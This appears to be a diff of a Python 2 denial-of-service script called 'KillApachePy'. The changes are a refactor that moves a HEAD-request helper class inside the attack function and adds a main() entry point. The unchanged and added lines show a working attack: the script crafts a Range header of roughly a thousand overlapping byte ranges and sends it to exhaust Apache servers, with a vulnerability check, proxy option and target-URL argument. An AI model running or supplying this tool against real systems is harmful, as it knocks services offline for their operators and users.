@@ -13,17 +13,6 @@ SLEEP_TIME      = 3     # time to wait for new thread slots (after max number re
 RANGE_NUMBER    = 1024  # number of range subitems forming the DoS payload
 USER_AGENT      = "KillApachePy (%s)" % VERSION
 
-class MethodRequest(urllib2.Request):
-    '''
-    Create non-GET/POST (e.g. HEAD/PUT/DELETE) requests with urllib2
-    '''
-
-    def set_method(self, method):
-        self.method = method.upper()
-
-    def get_method(self):
-        return getattr(self, 'method', urllib2.Request.get_method(self))
-
 def attack(url, user_agent=None, proxy=None):
     if '://' not in url:
         url = "http://%s" % url
@@ -40,13 +29,26 @@ def attack(url, user_agent=None, proxy=None):
     opener = urllib2.build_opener(proxy_support)
     urllib2.install_opener(opener)
 
+    class _MethodRequest(urllib2.Request):
+        '''
+        Create non-GET/POST (e.g. HEAD/PUT/DELETE) requests with urllib2
+        '''
+        def set_method(self, method):
+            self.method = method.upper()
+
+        def get_method(self):
+            return getattr(self, 'method', urllib2.Request.get_method(self))
+
     def _send(check=False):
+        '''
+        Send the vulnerable request to the target
+        '''
         if check:
             print "(i) Checking target for vulnerability..."
         payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
         try:
             headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip' }
-            req = MethodRequest(url, None, headers)
+            req = _MethodRequest(url, None, headers)
             req.set_method('HEAD')
             response = urllib2.urlopen(req)
             if check:
@@ -92,7 +94,7 @@ def attack(url, user_agent=None, proxy=None):
         print "\r(x) Ctrl-C was pressed"
         os._exit(1)
 
-if __name__ == "__main__":
+def main():
     print "%s #v%s\n by: %s\n\n(Note: %s)\n" % (NAME, VERSION, AUTHOR, SHORT)
     parser = optparse.OptionParser(version=VERSION)
     parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
@@ -103,3 +105,6 @@ if __name__ == "__main__":
         result = attack(options.url, options.agent, options.proxy)
     else:
         parser.print_help()
+
+if __name__ == "__main__":
+    main()
